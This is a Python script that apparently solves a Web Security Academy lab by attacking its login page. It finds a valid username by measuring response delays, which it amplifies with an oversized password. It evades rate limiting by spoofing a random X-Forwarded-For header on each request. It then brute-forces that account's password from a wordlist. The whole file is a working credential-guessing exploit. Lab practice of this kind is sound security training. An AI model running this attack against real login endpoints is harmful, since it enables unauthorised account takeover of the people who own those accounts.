from rich.console import Console
from rich.progress import track
import requests
import uuid


URL = "https://0aba00d504fde2b4c4f472b3006400cc.web-security-academy.net/login"

console = Console()
usernames = []
passwords = []

with open("usernames") as f:
    usernames = f.read().splitlines()

with open("passwords") as f:
    passwords = f.read().splitlines()

def try_username(username: str):
    response = requests.post(
        URL,
        data={"username": username, "password": "longpassword"*50},    # long password is needed since the hash function is slow -> if user is correct, the response will be slower
        headers={"X-Forwarded-For": str(uuid.uuid4())},             # header needed to bypass the rate limit
        allow_redirects=False
    )
    print(f"{username}\t\t{response.status_code} {response.elapsed.total_seconds()}")
    return response.elapsed.total_seconds()

def try_password(username: str, password: str):
    response = requests.post(
        URL,
        data={"username": username, "password": password},
        headers={"X-Forwarded-For": str(uuid.uuid4())},
        allow_redirects=False
    )
    print(f"{password}\t\t{response.status_code}")
    return response.status_code

times = []

# we first try to find the correct username (correct username will have a much slower response time)
for user in track(usernames, description="Trying usernames"):
    elapsed = try_username(user)
    times.append((user, elapsed))

# sort by desc elapsed time
times.sort(key=lambda x: x[1], reverse=True)

correct_username = times[0][0]
console.print(f"[bold green]Found username: {correct_username}[/bold green]")

for password in track(passwords, description="Trying passwords"):
    if try_password(correct_username, password) == 302:
        console.print(f"[bold green]Found password: {password}[/bold green]")
        break
